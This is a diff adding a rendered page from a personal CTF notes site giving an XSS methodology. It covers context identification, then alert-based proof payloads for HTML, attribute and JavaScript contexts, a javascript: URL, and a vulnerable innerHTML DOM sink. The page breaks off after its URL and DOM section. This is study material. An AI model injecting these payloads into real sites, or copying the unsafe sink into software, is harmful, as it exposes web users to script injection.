@@ -1,0 +1,743 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" data-theme="light">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Cross-site scripting Order: marker → locate exact output context → harmless execution proof → bot/admin workflow → read the challenge data. Reflection in JSON or escaped HTML alone is not XSS.
+1. Map source and sink Submit a unique marker such as CTF_MARK_731. Search raw HTML, response headers, JS bundles and the live DOM. For stored input, revisit list/detail/moderation/export views. For DOM input, inspect location.search, location.hash, postMessage, storage and JSON fetch responses.
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/web-expl/xss/">
+  <meta property="og:site_name" content="offsec-n0t3">
+  <meta property="og:title" content="XSS · Context Before Payload">
+  <meta property="og:description" content="Cross-site scripting Order: marker → locate exact output context → harmless execution proof → bot/admin workflow → read the challenge data. Reflection in JSON or escaped HTML alone is not XSS.
+1. Map source and sink Submit a unique marker such as CTF_MARK_731. Search raw HTML, response headers, JS bundles and the live DOM. For stored input, revisit list/detail/moderation/export views. For DOM input, inspect location.search, location.hash, postMessage, storage and JSON fetch responses.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+
+
+  <meta itemprop="name" content="XSS · Context Before Payload">
+  <meta itemprop="description" content="Cross-site scripting Order: marker → locate exact output context → harmless execution proof → bot/admin workflow → read the challenge data. Reflection in JSON or escaped HTML alone is not XSS.
+1. Map source and sink Submit a unique marker such as CTF_MARK_731. Search raw HTML, response headers, JS bundles and the live DOM. For stored input, revisit list/detail/moderation/export views. For DOM input, inspect location.search, location.hash, postMessage, storage and JSON fetch responses.">
+  <meta itemprop="wordCount" content="908">
+
+<title>XSS · Context Before Payload • offsec-n0t3</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/docs/web-expl/xss/">
+<link rel="stylesheet" href="/book.min.7886b6a45be989e541bea3447ffdf8cfa4eab5872c00b33d9895c3fe20798996.css" integrity="sha256-eIa2pFvpieVBvqNEf/34z6TqtYcsALM9mJXD/iB5iZY=" crossorigin="anonymous">
+
+
+<script type="module" src="/en.search.min.6641e65073282cb36eef05cedef40c45da2ae0b4450909d47bde09f2d8432c67.js" integrity="sha256-ZkHmUHMoLLNu7wXO3vQMRdoq4LRFCQnUe94J8thDLGc=" crossorigin="anonymous"></script>
+  <meta name="theme-color" content="#252637">
+
+<script defer src="/fieldbook.min.04e65c4f438e6e13ced1f07c11e88ce2991776fff8f8dab5afe6834a7cd40d67.js" integrity="sha256-BOZcT0OObhPO0fB8EeiM4pkXdv/4&#43;Nq1r&#43;aDSnzUDWc="></script>
+<link rel="icon" href="/images/fieldmark.svg" type="image/svg+xml">
+
+</head>
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<a class="field-brand" href="/" aria-label="offsec-n0t3 home">
+  <span class="brand-sigil" aria-hidden="true">忍</span>
+  <span><strong>offsec<span class="brand-accent">-n0t3</span></strong><small>CTF NOTES / OPEN BOOK</small></span>
+</a>
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text"
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+<div class="nav-caption">FIELD DIRECTORY <span aria-hidden="true">↙</span></div>
+<a class="directory-home" href="/docs/">⌂ &nbsp; All fieldnotes</a>
+
+
+
+
+
+
+<ul class="field-tree">
+  
+  
+  <li class="field-tree-section" data-collection="web">
+    <details open>
+      <summary><span>Web Exploitation</span><span class="tree-count">32</span></summary>
+      <ul><li><a href="/docs/web-expl/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/web-expl/methodology/" class="" >00 · First 10 Minutes</a></li>
+
+<li><a href="/docs/web-expl/sqli/" class="" >01 · SQLi — Start Here</a></li>
+
+<li><a href="/docs/web-expl/sqli-mysql/" class="" >02 · SQLi — MySQL / MariaDB</a></li>
+
+<li><a href="/docs/web-expl/sqli-postgresql/" class="" >03 · SQLi — PostgreSQL</a></li>
+
+<li><a href="/docs/web-expl/sqli-sqlite/" class="" >04 · SQLi — SQLite</a></li>
+
+<li><a href="/docs/web-expl/sqli-mssql/" class="" >05 · SQLi — SQL Server</a></li>
+
+<li><a href="/docs/web-expl/sqli-oracle/" class="" >06 · SQLi — Oracle</a></li>
+
+<li><a href="/docs/web-expl/sqli-blind/" class="" >07 · SQLi — Blind / Error</a></li>
+
+<li><a href="/docs/web-expl/source-disclosure/" class="" >08 · Source / Backup Leaks</a></li>
+
+<li><a href="/docs/web-expl/ssti/" class="" >SSTI · Identify the Engine First</a></li>
+
+<li><a href="/docs/web-expl/nosqli/" class="" >NoSQL Injection · Operators &amp; Blind Reads</a></li>
+
+<li><a href="/docs/web-expl/xss/" class="active" aria-current="page">XSS · Context Before Payload</a></li>
+
+<li><a href="/docs/web-expl/auth-idor/" class="" >Auth &amp; IDOR · Compare Two Accounts</a></li>
+
+<li><a href="/docs/web-expl/jwt/" class="" >JWT · Claims, Algorithms &amp; Keys</a></li>
+
+<li><a href="/docs/web-expl/oauth/" class="" >OAuth / Account Linking</a></li>
+
+<li><a href="/docs/web-expl/prototype-pollution/" class="" >Prototype Pollution · Source to Gadget</a></li>
+
+<li><a href="/docs/web-expl/graphql/" class="" >GraphQL · Schema to Resolver</a></li>
+
+<li><a href="/docs/web-expl/csrf-cors/" class="" >CSRF &amp; CORS · Send vs Read</a></li>
+
+<li><a href="/docs/web-expl/websockets/" class="" >WebSockets / Live Sessions</a></li>
+
+<li><a href="/docs/web-expl/command-injection/" class="" >Command Injection</a></li>
+
+<li><a href="/docs/web-expl/lfi-traversal/" class="" >Traversal &amp; LFI</a></li>
+
+<li><a href="/docs/web-expl/ssrf/" class="" >SSRF</a></li>
+
+<li><a href="/docs/web-expl/xxe/" class="" >XXE &amp; XML Parsers</a></li>
+
+<li><a href="/docs/web-expl/file-upload/" class="" >File Upload</a></li>
+
+<li><a href="/docs/web-expl/deserialization/" class="" >Deserialization</a></li>
+
+<li><a href="/docs/web-expl/business-logic/" class="" >Business Logic &amp; Races</a></li>
+
+<li><a href="/docs/web-expl/http-cache/" class="" >HTTP, Cache &amp; Smuggling</a></li>
+
+<li><a href="/docs/web-expl/php-quirks/" class="" >PHP · Types / Hashes / Parsers</a></li>
+
+<li><a href="/docs/web-expl/ldap-xpath/" class="" >LDAP / XPath Injection</a></li>
+
+<li><a href="/docs/web-expl/open-redirect/" class="" >Open Redirect / URL Parsing</a></li>
+
+<li><a href="/docs/web-expl/encoding-filters/" class="" >Encoding &amp; Filter Bypasses</a></li>
+
+<li><a href="/docs/web-expl/python-snippets/" class="" >Python · Reusable Web Helpers</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="network">
+    <details >
+      <summary><span>Network Exploitation</span><span class="tree-count">9</span></summary>
+      <ul><li><a href="/docs/network-expl/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/network-expl/packet-triage/" class="" >01 · Packet Triage</a></li>
+
+<li><a href="/docs/network-expl/http-streams/" class="" >02 · HTTP / File Streams</a></li>
+
+<li><a href="/docs/network-expl/dns/" class="" >03 · DNS / Encoded Labels</a></li>
+
+<li><a href="/docs/network-expl/tls-ssh/" class="" >04 · TLS / SSH</a></li>
+
+<li><a href="/docs/network-expl/tcp-udp/" class="" >05 · TCP / UDP Sessions</a></li>
+
+<li><a href="/docs/network-expl/wifi/" class="" >06 · Wi-Fi Capture Analysis</a></li>
+
+<li><a href="/docs/network-expl/can-bus/" class="" >07 · CAN / Cannelloni</a></li>
+
+<li><a href="/docs/network-expl/protocols/" class="" >08 · FTP / Mail / ICMP / SMB</a></li>
+
+<li><a href="/docs/network-expl/python-snippets/" class="" >09 · Python / Ready Helpers</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="stego">
+    <details >
+      <summary><span>Steganography</span><span class="tree-count">8</span></summary>
+      <ul><li><a href="/docs/steganograph-expl/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/steganograph-expl/triage/" class="" >First 10 Minutes</a></li>
+
+<li><a href="/docs/steganograph-expl/images-lsb/" class="" >Images: LSB &amp; Bit Planes</a></li>
+
+<li><a href="/docs/steganograph-expl/png-jpeg/" class="" >PNG &amp; JPEG Structure</a></li>
+
+<li><a href="/docs/steganograph-expl/archives-carving/" class="" >Archives &amp; File Carving</a></li>
+
+<li><a href="/docs/steganograph-expl/audio/" class="" >Audio: Samples &amp; Spectrograms</a></li>
+
+<li><a href="/docs/steganograph-expl/pdf-documents/" class="" >PDF &amp; Office Documents</a></li>
+
+<li><a href="/docs/steganograph-expl/text-unicode/" class="" >Text, Whitespace &amp; Unicode</a></li>
+
+<li><a href="/docs/steganograph-expl/python-snippets/" class="" >Offline Python Toolkit</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="reversing">
+    <details >
+      <summary><span>Reverse Engineering</span><span class="tree-count">9</span></summary>
+      <ul><li><a href="/docs/reversing-expl/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/reversing-expl/triage/" class="" >Triage · First Five Minutes</a></li>
+
+<li><a href="/docs/reversing-expl/ghidra-cheatsheet/" class="" >Ghidra Cheatsheet · From Strings to Check</a></li>
+
+<li><a href="/docs/reversing-expl/ghidra-plugins/" class="" >Ghidra Plugins · Built-ins &amp; Offline Extras</a></li>
+
+<li><a href="/docs/reversing-expl/static-analysis/" class="" >Static Analysis · Bytes, Types &amp; Control Flow</a></li>
+
+<li><a href="/docs/reversing-expl/dynamic-debugging/" class="" >Dynamic Debugging · Break, Inspect, Dump</a></li>
+
+<li><a href="/docs/reversing-expl/strings-encodings/" class="" >Strings &amp; Encodings · Preserve the Bytes</a></li>
+
+<li><a href="/docs/reversing-expl/crypto-obfuscation/" class="" >Crypto &amp; Obfuscation · Identify, Model, Verify</a></li>
+
+<li><a href="/docs/reversing-expl/dotnet/" class="" >.NET · dnSpyEx, Resources &amp; IL</a></li>
+
+<li><a href="/docs/reversing-expl/python-snippets/" class="" >Python Snippets · Byte Workbench &amp; Check Models</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="tools">
+    <details >
+      <summary><span>Tools · Visual Cheatsheets</span><span class="tree-count">3</span></summary>
+      <ul><li><a href="/docs/tools-cheatsheet/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/tools-cheatsheet/cyberchef-cheatsheet/" class="" >CyberChef · Visual Recipes</a></li>
+
+<li><a href="/docs/tools-cheatsheet/approved-tools-map/" class="" >39 Tools · Technique Map</a></li>
+
+<li><a href="/docs/tools-cheatsheet/python-library/" class="" >Python · Offline Snippet Library</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li><a href="/docs/cli_cheatsheet/" class="">CLI Cheatsheet</a></li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="pico">
+    <details >
+      <summary><span>picoCTF</span><span class="tree-count">4</span></summary>
+      <ul><li><a href="/docs/picoctf/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><details ><summary>Rev</summary><ul><li><a href="/docs/picoctf/rev/">Overview ↗</a></li>
+
+</ul></details></li>
+
+<li><details ><summary>Web</summary><ul><li><a href="/docs/picoctf/web/">Overview ↗</a></li>
+
+<li><a href="/docs/picoctf/web/file_upload/" class="" >File Upload</a></li>
+
+<li><a href="/docs/picoctf/web/ip_bypassing/" class="" >Proxy Mnipu</a></li>
+
+<li><a href="/docs/picoctf/web/sqli/" class="" >Sqli</a></li>
+
+<li><a href="/docs/picoctf/web/eval_ssti/" class="" >SSTI</a></li>
+
+</ul></details></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="scripts">
+    <details >
+      <summary><span>Scripts</span><span class="tree-count">3</span></summary>
+      <ul><li><a href="/docs/scripts/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/scripts/brute_force_py/" class="" >Brute Force Py</a></li>
+
+<li><a href="/docs/scripts/craft_img_py/" class="" >Craft Img Py</a></li>
+
+<li><a href="/docs/scripts/lro_rlo_fileext/" class="" >Lro Rlo File Ext</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="windows">
+    <details >
+      <summary><span>Windows Rev</span><span class="tree-count">3</span></summary>
+      <ul><li><a href="/docs/windows_rev/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/windows_rev/arc4_decrypt/" class="" >Arc4 Decrypt</a></li>
+
+<li><a href="/docs/windows_rev/dmp_hunt4c2/" class="" >Dmp Hunt4c2</a></li>
+
+<li><a href="/docs/windows_rev/x64dbg_cheatsheet/" class="" >X64dbg Cheatsheet</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="approved">
+    <details >
+      <summary><span>AJCBBC Allowed Tools</span><span class="tree-count">39</span></summary>
+      <ul><li><a href="/docs/ajcbbc_allow_tools/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/ajcbbc_allow_tools/cyberchef/" class="" >CyberChef</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/wireshark/" class="" >Wireshark</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/pdf_viewer/" class="" >PDF Viewer</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/openvpn_client/" class="" >OpenVPN Client</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/google_chrome/" class="" >Google Chrome</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/wsl/" class="" >Windows Subsystem for Linux (WSL)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/python3/" class="" >Python 3</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/uv/" class="" >uv</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/gdb/" class="" >gdb</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/objdump/" class="" >objdump</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/strings/" class="" >strings</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/zsteg/" class="" >zsteg</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/binwalk/" class="" >binwalk</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/exiftool/" class="" >ExifTool</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/pdftotext/" class="" >pdftotext (Poppler utils)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/can_utils/" class="" >can-utils</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/cannelloni/" class="" >cannelloni</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/zeek/" class="" >Zeek</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/zbar/" class="" >ZBar</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/burp_suite_community/" class="" >Burp Suite Community Edition</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/jq/" class="" >jq</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/ghidra/" class="" >Ghidra</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/sleuth_kit/" class="" >The Sleuth Kit</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/openssl/" class="" >OpenSSL</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/xz/" class="" >xz</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/qpdf/" class="" >qpdf</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/llvm_mc/" class="" >llvm-mc (LLVM tools)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/xxd/" class="" >xxd</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/fsck_fat/" class="" >fsck.fat (dosfstools)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/rsactftool/" class="" >RsaCtfTool</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/volatility3/" class="" >Volatility 3</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/openssh_session_key_recovery/" class="" >OpenSSH-Session-Key-Recovery</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/x64dbg/" class="" >x64dbg</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/autopsy/" class="" >Autopsy</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/hxd/" class="" >HxD</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/tshark/" class="" >TShark</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/notepad_plus_plus/" class="" >Notepad&#43;&#43;</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/dnspyex/" class="" >dnSpyEx (dnSpy)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/eric_zimmerman_tools/" class="" >Eric Zimmerman&#39;s Tools</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+</ul>
+
+
+
+
+
+
+
+<div class="nav-footer"><span class="status-dot" aria-hidden="true"></span> OFFLINE / PERSONAL NOTES<br><span>Payloads · methods · worked examples</span></div>
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header hidden">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>XSS · Context Before Payload</h3>
+
+  <label for="toc-control">
+    
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden">
+    
+  <div class="nav-caption">ON THIS PAGE</div>
+
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-map-source-and-sink">1. Map source and sink</a></li>
+    <li><a href="#2-html-text-first-proof">2. HTML text: first proof</a></li>
+    <li><a href="#3-attribute-contexts">3. Attribute contexts</a></li>
+    <li><a href="#4-javascript-contexts">4. JavaScript contexts</a></li>
+    <li><a href="#5-url-and-dom-sources">5. URL and DOM sources</a></li>
+    <li><a href="#6-stored-xss--admin-bot-complete-the-chain">6. Stored XSS / admin bot: complete the chain</a></li>
+    <li><a href="#7-csp-and-sanitization-troubleshooting">7. CSP and sanitization troubleshooting</a></li>
+    <li><a href="#8-what-to-save">8. What to save</a></li>
+    <li><a href="#tool-workflow">Tool workflow</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      <div id="field-content" tabindex="-1"></div>
+
+<div class="page-topline" data-collection="web"><nav aria-label="Breadcrumb"><a href="/docs/">NOTEBOOK</a><span>/</span><a href="/docs/web-expl/">Web Exploitation</a></nav><span>5 MIN READ</span></div>
+
+
+
+      
+  <article class="markdown book-article"><h1 id="cross-site-scripting">Cross-site scripting<a class="anchor" href="#cross-site-scripting"></a></h1>
+<p><strong>Order: marker → locate exact output context → harmless execution proof → bot/admin workflow → read the challenge data.</strong> Reflection in JSON or escaped HTML alone is not XSS.</p>
+<h2 id="1-map-source-and-sink">1. Map source and sink<a class="anchor" href="#1-map-source-and-sink"></a></h2>
+<p>Submit a unique marker such as <code>CTF_MARK_731</code>. Search raw HTML, response headers, JS bundles and the live DOM. For stored input, revisit list/detail/moderation/export views. For DOM input, inspect <code>location.search</code>, <code>location.hash</code>, <code>postMessage</code>, storage and JSON fetch responses.</p>
+<table>
+  <thead>
+      <tr>
+          <th>Sink/context</th>
+          <th>First question</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>HTML text</td>
+          <td>Are <code>&lt;</code> and <code>&gt;</code> parsed or encoded?</td>
+      </tr>
+      <tr>
+          <td>Quoted attribute</td>
+          <td>Can the matching quote end the value?</td>
+      </tr>
+      <tr>
+          <td>Unquoted attribute</td>
+          <td>Can a space create a new attribute?</td>
+      </tr>
+      <tr>
+          <td>JS string</td>
+          <td>Which quote, escaping and surrounding expression?</td>
+      </tr>
+      <tr>
+          <td>URL value</td>
+          <td>Is the URL scheme controlled and navigation triggered?</td>
+      </tr>
+      <tr>
+          <td><code>innerHTML</code> / <code>insertAdjacentHTML</code></td>
+          <td>Does the browser create active HTML?</td>
+      </tr>
+      <tr>
+          <td><code>textContent</code></td>
+          <td>Normally text, not markup execution</td>
+      </tr>
+      <tr>
+          <td><code>eval</code>, <code>Function</code>, string timer</td>
+          <td>Is input actually evaluated as JavaScript?</td>
+      </tr>
+  </tbody>
+</table>
+<p>Inspect DOM as well as source: browser HTML parsing can move, normalize or discard malformed markup.</p>
+<h2 id="2-html-text-first-proof">2. HTML text: first proof<a class="anchor" href="#2-html-text-first-proof"></a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#eceff4">&lt;</span><span style="color:#81a1c1">b</span><span style="color:#eceff4">&gt;</span>CTF_MARK_731<span style="color:#eceff4">&lt;/</span><span style="color:#81a1c1">b</span><span style="color:#eceff4">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#eceff4">&lt;</span><span style="color:#81a1c1">img</span> <span style="color:#8fbcbb">src</span><span style="color:#81a1c1">=</span><span style="color:#a3be8c">x</span> <span style="color:#8fbcbb">onerror</span><span style="color:#81a1c1">=</span><span style="color:#a3be8c">alert(731)</span><span style="color:#eceff4">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#eceff4">&lt;</span><span style="color:#81a1c1">svg</span> <span style="color:#8fbcbb">onload</span><span style="color:#81a1c1">=</span><span style="color:#a3be8c">alert(731)</span><span style="color:#eceff4">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#eceff4">&lt;</span><span style="color:#81a1c1">script</span><span style="color:#eceff4">&gt;</span>alert<span style="color:#eceff4">(</span><span style="color:#b48ead">731</span><span style="color:#eceff4">)&lt;/</span><span style="color:#81a1c1">script</span><span style="color:#eceff4">&gt;</span></span></span></code></pre></div><p>Use the bold marker to establish HTML interpretation, then a distinct execution marker. Scripts inserted through <code>innerHTML</code> generally do not execute; event handlers can still execute if permitted by policy. A CSP can block inline handlers and scripts even when markup injection is real.</p>
+<h2 id="3-attribute-contexts">3. Attribute contexts<a class="anchor" href="#3-attribute-contexts"></a></h2>
+<p>If output is <code>&lt;input value=&quot;INPUT&quot;&gt;</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&#34; autofocus onfocus=alert(731) x=&#34;
+</span></span><span style="display:flex;"><span>&#34;&gt;<span style="color:#eceff4">&lt;</span><span style="color:#81a1c1">img</span> <span style="color:#8fbcbb">src</span><span style="color:#81a1c1">=</span><span style="color:#a3be8c">x</span> <span style="color:#8fbcbb">onerror</span><span style="color:#81a1c1">=</span><span style="color:#a3be8c">alert(731)</span><span style="color:#eceff4">&gt;</span></span></span></code></pre></div><p>If output uses single quotes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&#39; autofocus onfocus=alert(731) x=&#39;
+</span></span><span style="display:flex;"><span>&#39;&gt;<span style="color:#eceff4">&lt;</span><span style="color:#81a1c1">img</span> <span style="color:#8fbcbb">src</span><span style="color:#81a1c1">=</span><span style="color:#a3be8c">x</span> <span style="color:#8fbcbb">onerror</span><span style="color:#81a1c1">=</span><span style="color:#a3be8c">alert(731)</span><span style="color:#eceff4">&gt;</span></span></span></code></pre></div><p>For an unquoted value, a whitespace separator can introduce an attribute:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>x autofocus onfocus=alert(731)</span></span></code></pre></div><p><code>autofocus</code> depends on browser behavior, focus state and element support. A new image error is often a clearer probe. Quote encodings such as <code>&amp;quot;</code> <strong>inside an existing attribute value</strong> do not normally terminate that attribute: the tokenizer does not reparse decoded quotes as structure.</p>
+<h2 id="4-javascript-contexts">4. JavaScript contexts<a class="anchor" href="#4-javascript-contexts"></a></h2>
+<p>For exactly <code>const name = 'INPUT';</code> inside an inline script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#bf616a">&#39;</span><span style="color:#eceff4">;</span>alert<span style="color:#eceff4">(</span><span style="color:#b48ead">731</span><span style="color:#eceff4">);</span><span style="color:#616e87;font-style:italic">//
+</span></span></span></code></pre></div><p>For exactly <code>const name = &quot;INPUT&quot;;</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#bf616a">&#34;</span><span style="color:#eceff4">;</span>alert<span style="color:#eceff4">(</span><span style="color:#b48ead">731</span><span style="color:#eceff4">);</span><span style="color:#616e87;font-style:italic">//
+</span></span></span></code></pre></div><p>If untrusted input lands inside an HTML <code>&lt;script&gt;</code> element, the HTML parser recognizes its closing tag even while JS thinks it is in a string:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#eceff4">&lt;/</span><span style="color:#81a1c1">script</span><span style="color:#eceff4">&gt;&lt;</span><span style="color:#81a1c1">img</span> <span style="color:#8fbcbb">src</span><span style="color:#81a1c1">=</span><span style="color:#a3be8c">x</span> <span style="color:#8fbcbb">onerror</span><span style="color:#81a1c1">=</span><span style="color:#a3be8c">alert(731)</span><span style="color:#eceff4">&gt;</span></span></span></code></pre></div><p>That closing-tag route does not apply to external JS files or JSON served as <code>application/json</code>. In a JavaScript template literal, an unescaped interpolation may evaluate:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>$<span style="color:#eceff4">{</span>alert<span style="color:#eceff4">(</span><span style="color:#b48ead">731</span><span style="color:#eceff4">)}</span></span></span></code></pre></div><p>Backslash count matters. Read the <strong>final response bytes</strong>, not just your submitted input. A broken script without controlled execution is a syntax error, not a successful proof.</p>
+<h2 id="5-url-and-dom-sources">5. URL and DOM sources<a class="anchor" href="#5-url-and-dom-sources"></a></h2>
+<p>Where an actual navigated <code>href</code> accepts arbitrary schemes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>javascript:alert(731)</span></span></code></pre></div><p>This generally requires activation; it is not a generic payload for <code>&lt;img src&gt;</code>. A bot may never click links. Protocol validation and CSP can block it.</p>
+<p>A typical DOM chain to recognize in client source:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">const</span> q <span style="color:#81a1c1">=</span> <span style="color:#81a1c1;font-weight:bold">new</span> URLSearchParams<span style="color:#eceff4">(</span>location<span style="color:#eceff4">.</span>search<span style="color:#eceff4">).</span>get<span style="color:#eceff4">(</span><span style="color:#a3be8c">&#39;q&#39;</span><span style="color:#eceff4">);</span>
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1">document</span><span style="color:#eceff4">.</span>querySelector<span style="color:#eceff4">(</span><span style="color:#a3be8c">&#39;#result&#39;</span><span style="color:#eceff4">).</span>innerHTML <span style="color:#81a1c1">=</span> q<span style="color:#eceff4">;</span></span></span></code></pre></div><p>Use <code>?q=%3Cimg%20src%3Dx%20onerror%3Dalert(731)%3E</code> for that sink. A hash source may decode differently; fragments are visible to client JS and are not sent in HTTP requests. <code>document.write</code>, <code>outerHTML</code>, jQuery HTML constructors and third-party template renderers need separate context checks.</p>
